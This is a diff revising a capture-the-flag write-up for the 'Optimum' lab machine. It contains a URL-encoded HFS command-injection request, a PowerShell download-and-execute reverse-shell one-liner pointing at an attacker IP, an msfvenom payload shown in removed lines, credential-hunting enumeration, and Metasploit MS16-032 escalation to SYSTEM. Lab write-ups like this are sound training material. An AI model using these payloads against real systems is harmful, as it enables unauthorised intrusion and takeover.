@@ -156,38 +156,31 @@ First, I'll setup a listener to receive the shell.
 listening on [any] 9001 ...
 ```
 
-Then I'll use `msfvenom` to create the reverse payload.
-
-```sh
-❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f exe -o /workspace/server/revshell.exe
-```
+Then I'll choose the 'Powershell #3 (Base64)' payload from [this website](https://www.revshells.com/) to get the reverse shell. I'll save it in `/workspace/server/revshell.ps1`.
 
 ## Exploitation
 
 Now let's exploit this CVE to obtain a reverse shell.
 
-Our goal is to download `revshell.exe`, place it in `C:\tmp\`, and execute it. We can use this one-liner for this:
+Our goal is to download `revshell.ps1` and execute it in memory. We can use this one-liner for this:
 
-```cmd
-cmd.exe /c "mkdir C:\tmp & copy \\10.10.14.5\server\revshell.exe C:\tmp\revshell.exe & C:\tmp\revshell.exe"
+```ps1
+powershell.exe -c "IEX(IWR 'http://10.10.14.30:8000/revshell.ps1')"
 ```
 
 To execute a command, we must specify the value `%00{{.exec|<COMMAND>.}}` to the GET parameter `search`, where `<COMMAND>` is the command we want to execute.
 
-Let's fill in our reverse shell payload, URL encode the `search` value, and use `curl` to send the request:
+Let's fill in our payload to download and execute the reverse shell, URL encode the `search` value, and use `curl` to send the request:
 
 ```sh
-❯ curl http://10.10.10.8/?search=%00%7B%7B.exec%7Ccmd.exe%20%2Fc%20%22mkdir%20C%3A%5Ctmp%20%26%20copy%20%5C%5C10.10.14.5%5Cserver%5Crevshell.exe%20C%3A%5Ctmp%5Crevshell.exe%20%26%20C%3A%5Ctmp%5Crevshell.exe%22.%7D%7D -s
+❯ curl http://10.10.10.8/?search=%00%7B%7B.exec%7Cpowershell.exe%20-c%20%22IEX%28IWR%20%27http%3A%2F%2F10.10.14.5%3A8000%2Frevshell.ps1%27%29%22.%7D%7D -s
 ```
 
 If we check our listener:
 
 ```
 connect to [10.10.14.5] from (UNKNOWN) [10.10.10.8] 49164
-Microsoft Windows [Version 6.3.9600]
-(c) 2013 Microsoft Corporation. All rights reserved.
-
-C:\Users\kostas\Desktop>
+PS C:\Users\kostas\Desktop>
 ```
 
 It successfully caught the reverse shell! Nice!
@@ -200,8 +193,8 @@ If we run `whoami`, we see that we got a foothold as `kostas`.
 
 Let's gather some information about the Windows version of Optimum.
 
-```cmd
-C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
+```ps1
+PS C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
 ```
 
 ```
@@ -211,8 +204,8 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
 
 Okay, so this is Windows Server 2012!
 
-```cmd
-C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
+```ps1
+PS C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
 ```
 
 ```
@@ -228,8 +221,8 @@ This version of Windows is somewhat recent, but maybe there are missing hotfixes
 
 What is Optimum's architecture?
 
-```cmd
-C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
+```ps1
+PS C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
 ```
 
 ```
@@ -243,8 +236,8 @@ So this system is using x64. This will be useful to know if we want to compile o
 
 Let's check if Windows Defender is enabled.
 
-```cmd
-C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
+```ps1
+PS C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
 ```
 
 ```
@@ -257,8 +250,8 @@ Nothing!
 
 Let's check if there's any AMSI provider.
 
-```cmd
-C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
+```ps1
+PS C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
 ```
 
 ```
@@ -271,8 +264,8 @@ As for Windows Defender, there's nothing.
 
 Let's see which Windows Firewall policies profiles are enabled.
 
-```cmd
-C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
+```ps1
+PS C:\Users\kostas\Desktop> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
 ```
 
 ```
@@ -294,8 +287,8 @@ Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression 
 
 Let's gather the list of connected NICs.
 
-```cmd
-C:\Users\kostas\Desktop> ipconfig /all
+```ps1
+PS C:\Users\kostas\Desktop> ipconfig /all
 ```
 
 ```
@@ -334,8 +327,8 @@ Looks like there's a single network.
 
 Let's enumerate all local users using `PowerView`.
 
-```cmd
-C:\Users\kostas\Desktop> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table"
+```ps1
+PS C:\Users\kostas\Desktop> Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table
 ```
 
 ```
@@ -350,8 +343,8 @@ It looks like there's only us, `kostas`.
 
 Let's enumerate all local groups, once again using `PowerView`.
 
-```cmd
-C:\Users\kostas\Desktop> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096"
+```ps1
+PS C:\Users\kostas\Desktop> Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096
 ```
 
 ```
@@ -388,8 +381,8 @@ Looks classic.
 
 Let's gather more information about us.
 
-```cmd
-C:\Users\kostas\Desktop> net user kostas
+```ps1
+PS C:\Users\kostas\Desktop> net user kostas
 ```
 
 ```
@@ -426,8 +419,8 @@ We don't belong to interesting groups.
 
 If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.
 
-```cmd
-C:\Users\kostas\Desktop> type C:\Users\kostas\Desktop\user.txt
+```ps1
+PS C:\Users\kostas\Desktop> type $env:USERPROFILE\Desktop\user.txt
 ```
 
 ```
@@ -448,8 +441,8 @@ Let's now focus on our tokens.
 
 Which security groups are associated with our access tokens?
 
-```cmd
-C:\Users\kostas\Desktop> whoami /groups
+```ps1
+PS C:\Users\kostas\Desktop> whoami /groups
 ```
 
 ```
@@ -474,8 +467,8 @@ Unfortunately, there's nothing that we can abuse.
 
 What about the privileges associated with our access tokens?
 
-```cmd
-C:\Users\kostas\Desktop> whoami /priv
+```ps1
+PS C:\Users\kostas\Desktop> whoami /priv
 ```
 
 ```
@@ -494,8 +487,8 @@ There's nothing that we can leverage to elevate our privileges.
 
 Let's list the SMB shares available on Optimum, using the same version of `PowerView` as before.
 
-```cmd
-C:\Users\kostas\Desktop> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetShare | Select-Object Name, Remark | Format-Table"
+```ps1
+PS C:\Users\kostas\Desktop> Get-NetShare | Select-Object Name, Remark | Format-Table
 ```
 
 ```
@@ -512,14 +505,14 @@ So there's only default administrative shares.
 
 Let's check the environment variables for our shell. Maybe we'll find something out of the ordinary?
 
-```cmd
-C:\Users\kostas\Desktop> set
+```ps1
+PS C:\Users\kostas\Desktop> Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" }
 ```
 
 ```
 ALLUSERSPROFILE=C:\ProgramData
 APPDATA=C:\Users\kostas\AppData\Roaming
-CommonProgramFiles=C:\Program Files\Common Files
+CommonProgramFiles=C:\Program Files (x86)\Common Files
 CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
 CommonProgramW6432=C:\Program Files\Common Files
 COMPUTERNAME=OPTIMUM
@@ -532,17 +525,17 @@ LOGONSERVER=\\OPTIMUM
 NUMBER_OF_PROCESSORS=2
 OS=Windows_NT
 Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
-PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
-PROCESSOR_ARCHITECTURE=AMD64
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+PROCESSOR_ARCHITECTURE=x86
+PROCESSOR_ARCHITEW6432=AMD64
 PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
 PROCESSOR_LEVEL=23
 PROCESSOR_REVISION=3100
 ProgramData=C:\ProgramData
-ProgramFiles=C:\Program Files
+ProgramFiles=C:\Program Files (x86)
 ProgramFiles(x86)=C:\Program Files (x86)
 ProgramW6432=C:\Program Files
-PROMPT=$P$G
-PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+PSModulePath=C:\Users\kostas\Documents\WindowsPowerShell\Modules;C:\Program Files (x86)\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
 PUBLIC=C:\Users\Public
 SESSIONNAME=Console
 SystemDrive=C:
@@ -562,8 +555,8 @@ There's nothing interesting.
 
 Let's see if any TCP local ports are listening for connections.
 
-```cmd
-C:\Users\kostas> netstat -ano | findstr /C:"LISTENING" | findstr /C:"TCP"
+```ps1
+PS C:\Users\kostas\Desktop> netstat -ano | findstr /C:"LISTENING" | findstr /C:"TCP"
 ```
 
 ```
@@ -595,8 +588,8 @@ There's a few open ports, but nothing out of the ordinary.
 
 What about UDP then?
 
-```cmd
-C:\Users\kostas> netstat -ano | findstr /C:"LISTENING" | findstr /C:"UDP"
+```ps1
+PS C:\Users\kostas\Desktop> netstat -ano | findstr /C:"LISTENING" | findstr /C:"UDP"
 ```
 
 Nothing!
@@ -605,8 +598,8 @@ Nothing!
 
 Let's check which processes are running.
 
-```cmd
-C:\Users\kostas> tasklist /svc
+```ps1
+PS C:\Users\kostas\Desktop> tasklist /svc
 ```
 
 ```
@@ -614,55 +607,54 @@ Image Name                     PID Services
 ========================= ======== ============================================
 System Idle Process              0 N/A                                         
 System                           4 N/A                                         
-smss.exe                       232 N/A                                         
+smss.exe                       228 N/A                                         
 csrss.exe                      332 N/A                                         
-wininit.exe                    388 N/A                                         
-csrss.exe                      396 N/A                                         
-winlogon.exe                   440 N/A                                         
-services.exe                   480 N/A                                         
-lsass.exe                      488 SamSs                                       
-svchost.exe                    552 BrokerInfrastructure, DcomLaunch, LSM,      
+wininit.exe                    384 N/A                                         
+csrss.exe                      392 N/A                                         
+winlogon.exe                   436 N/A                                         
+services.exe                   476 N/A                                         
+lsass.exe                      484 SamSs                                       
+svchost.exe                    544 BrokerInfrastructure, DcomLaunch, LSM,      
                                    PlugPlay, Power, SystemEventsBroker         
-svchost.exe                    580 RpcEptMapper, RpcSs                         
-dwm.exe                        672 N/A                                         
-svchost.exe                    680 Dhcp, EventLog, lmhosts, Wcmsvc             
-svchost.exe                    708 DsmSvc, gpsvc, iphlpsvc, LanmanServer,      
+svchost.exe                    572 RpcEptMapper, RpcSs                         
+dwm.exe                        668 N/A                                         
+svchost.exe                    676 Dhcp, EventLog, lmhosts, Wcmsvc             
+svchost.exe                    704 DsmSvc, gpsvc, iphlpsvc, LanmanServer,      
                                    ProfSvc, Schedule, SENS, ShellHWDetection,  
                                    Themes, Winmgmt                             
-svchost.exe                    776 EventSystem, FontCache, netprofm, nsi,      
-                                   W32Time, WinHttpAutoProxySvc                
-svchost.exe                    840 CryptSvc, Dnscache, LanmanWorkstation,      
+svchost.exe                    768 EventSystem, FontCache, netprofm, nsi,      
+                                   RemoteRegistry, WinHttpAutoProxySvc         
+svchost.exe                    836 CryptSvc, Dnscache, LanmanWorkstation,      
                                    NlaSvc, WinRM                               
-svchost.exe                    964 BFE, DPS, MpsSvc                            
-spoolsv.exe                    476 Spooler                                     
-svchost.exe                    812 TrkWks, UALSVC                              
-VGAuthService.exe              384 VGAuthService                               
-vmtoolsd.exe                  1032 VMTools                                     
-ManagementAgentHost.exe       1048 VMwareCAFManagementAgentHost                
-svchost.exe                   1364 PolicyAgent                                 
-dllhost.exe                   1460 COMSysApp                                   
-WmiPrvSE.exe                  1620 N/A                                         
-msdtc.exe                     1696 MSDTC                                       
+svchost.exe                    956 BFE, DPS, MpsSvc                            
+spoolsv.exe                    524 Spooler                                     
+svchost.exe                    660 TrkWks, UALSVC                              
+VGAuthService.exe              856 VGAuthService                               
+vmtoolsd.exe                  1036 VMTools                                     
+ManagementAgentHost.exe       1052 VMwareCAFManagementAgentHost                
+svchost.exe                   1192 PolicyAgent                                 
+dllhost.exe                   1476 COMSysApp                                   
+WmiPrvSE.exe                  1616 N/A                                         
+msdtc.exe                     1648 MSDTC                                       
+WmiPrvSE.exe                  2036 N/A                                         
 taskhostex.exe                2084 N/A                                         
-explorer.exe                  2188 N/A                                         
-vmtoolsd.exe                  2732 N/A                                         
-hfs.exe                       2776 N/A                                         
-cmd.exe                       2156 N/A                                         
-conhost.exe                   1664 N/A                                         
-revshell.exe                   240 N/A                                         
-cmd.exe                       1040 N/A                                         
-conhost.exe                   2040 N/A                                         
-tasklist.exe                   860 N/A
+explorer.exe                  2152 N/A                                         
+vmtoolsd.exe                  2608 N/A                                         
+hfs.exe                       2636 N/A                                         
+powershell.exe                1636 N/A                                         
+conhost.exe                    712 N/A                                         
+powershell.exe                1400 N/A                                         
+tasklist.exe                   760 N/A
 ```
 
-There's nothing unusual here... we find the `hfs.exe` process used for the website, and `revshell.exe` corresponding to our reverse shell.
+There's nothing unusual here... we only find the `hfs.exe` process used for the website.
 
 ## User autologon
 
 Let's check the registry for user autologon entries.
 
-```cmd
-C:\Users\kostas\Desktop> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUsername DefaultDomainName DefaultPassword"
+```ps1
+PS C:\Users\kostas\Desktop> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUsername DefaultDomainName DefaultPassword"
 ```
 
 ```
@@ -678,8 +670,8 @@ Unfortunately we can't do anything with this information, so let's continue look
 
 Let's check the credential manager for currently stored credentials. Maybe it contains something?
 
-```cmd
-C:\Users\kostas\Desktop> cmdkey /list
+```ps1
+PS C:\Users\kostas\Desktop> cmdkey /list
 ```
 
 ```
@@ -694,8 +686,8 @@ Nothing.
 
 Let's check if the `AlwaysInstallElevated` registry key is set.
 
-```cmd
-C:\Users\kostas\Desktop> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```ps1
+PS C:\Users\kostas\Desktop> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
 ```
@@ -708,8 +700,8 @@ It isn't.
 
 Alright, I guess it's time to check for known exploits that might affect Optimum. I'm going to use [Sherlock](https://github.com/rasta-mouse/Sherlock) for that.
 
-```cmd
-C:\Users\kostas\Desktop> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\Sherlock.ps1; Find-AllVulns | Select-Object Title, MSBulletin, CVEID, VulnStatus | Format-Table | Out-String -Width 4096"
+```ps1
+PS C:\Users\kostas\Desktop> Find-AllVulns | Select-Object Title, MSBulletin, CVEID, VulnStatus | Format-Table | Out-String -Width 4096
 ```
 
 ```
@@ -735,7 +727,7 @@ If we search [ExploitDB](https://www.exploit-db.com/) for a PoC, we find a Metas
 
 # Privilege escalation ([CVE-2016-0099](https://nvd.nist.gov/vuln/detail/CVE-2016-0099))
 
-[CVE-2016-0099](https://nvd.nist.gov/vuln/detail/CVE-2016-0099) is part of [MS16-032](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-032). This is a vulnerability in Microsoft Windows that allows local users to gain elevated privileges. The vulnerability resides in the Secondary Logon Service (S4L), which is responsible for handling user logon requests. S4L utilizes a mechanism called "security context virtualization" (SCV) to temporarily elevate the privileges of processes performing certain actions, such as accessing system resources. The flaw in SCV arises from improper handling of request handles, which are temporary tokens used to identify and manage user requests. We can exploit this flaw by crafting applications to trick S4L into granting elevated privileges to processes that don't deserve them.
+[CVE-2016-0099](https://nvd.nist.gov/vuln/detail/CVE-2016-0099) is part of [MS16-032](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-032). This is a vulnerability in Microsoft Windows that allows local users to gain elevated privileges. The vulnerability resides in the Secondary Logon Service (S4L), which is responsible for handling user logon requests. S4L utilizes a mechanism called "Security Context Virtualization" (SCV) to temporarily elevate the privileges of processes performing certain actions, such as accessing system resources. The flaw in SCV arises from improper handling of request handles, which are temporary tokens used to identify and manage user requests. We can exploit this flaw by crafting applications to trick S4L into granting elevated privileges to processes that don't deserve them.
 
 ## Preparation
 
@@ -762,16 +754,16 @@ Now we have a meterpreter session! Let's `background` it.
 
 ## Exploitation
 
-Let's use the Metasploit module and configure it to use a `windows/x64/shell_reverse_tcp` payload.
+Let's use the Metasploit module `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` and configure it to use a `windows/x64/shell_reverse_tcp` payload.
 
-I'm going to start a listener on port `9002`:
+I'm going to start a listener on port `9003`:
 
 ```sh
-❯ rlwrap nc -lvnp 9002
+❯ rlwrap nc -lvnp 9003
 ```
 
 ```
-listening on [any] 9002 ...
+listening on [any] 9003 ...
 ```
 
 Now it's time to launch the exploit!
@@ -779,8 +771,8 @@ Now it's time to launch the exploit!
 ```sh
 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
 
-[-] Handler failed to bind to 10.10.14.5:9002:-  -
-[-] Handler failed to bind to 0.0.0.0:9002:-  -
+[-] Handler failed to bind to 10.10.14.5:9003:-  -
+[-] Handler failed to bind to 0.0.0.0:9003:-  -
 <SNIP>
 [*] Executing exploit script...
 <SNIP>
@@ -799,17 +791,9 @@ Microsoft Windows [Version 6.3.9600]
 C:\Users\kostas\Desktop>
 ```
 
-Let's confirm that we are `NT AUTHORITY\SYSTEM`:
+It's a standard one though, so I'll transform it into a Powershell session.
 
-```cmd
-C:\Users\kostas\Desktop> whoami
-```
-
-```
-nt authority\system
-```
-
-Great!
+If we run `whoami`, we can confirm that we are `NT AUTHORITY\SYSTEM`!
 
 # Local enumeration
 
@@ -817,8 +801,8 @@ Great!
 
 The only thing we need to do to finish this box is to retrieve the root flag. As usual, we can find it on our Desktop!
 
-```cmd
-C:\Users\kostas\Desktop> type C:\Users\Administrator\Desktop\root.txt
+```ps1
+PS C:\Users\kostas\Desktop> type C:\Users\Administrator\Desktop\root.txt
 ```
 
 ```
